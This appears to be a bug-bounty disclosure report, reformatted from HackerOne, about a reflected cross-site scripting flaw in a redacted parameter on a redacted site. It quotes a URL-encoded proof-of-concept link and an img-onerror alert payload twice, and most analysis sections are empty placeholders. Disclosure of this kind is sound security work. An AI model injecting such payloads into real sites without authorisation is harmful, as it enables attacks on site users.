# xss on https://███████(█████████ parameter)

## Metadata
- **Source:** HackerOne
- **Report:** 1143780 | https://hackerone.com/reports/1143780
- **Submitted:** 2021-03-31
- **Reporter:** fiveguyslover
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Greetings, i've found an xss on https://████████(██████████ parameter)

link :████████.█████████████=%22/%3E%3Cimg%20src=x%20onerror=(alert)(1)%3E
Payload : 
```
"/><img src=x onerror=(alert)(1)/>
```
████████

best regards,
frenchvlad

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attac

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Greetings, i've found an xss on https://████████(██████████ parameter)

link :████████.█████████████=%22/%3E%3Cimg%20src=x%20onerror=(alert)(1)%3E
Payload : 
```
"/><img src=x onerror=(alert)(1)/>
```
████████

best regards,
frenchvlad

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
link :██████████████████.████████████=%22/%3E%3Cimg%20src=x%20onerror=(alert)(1)%3E

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
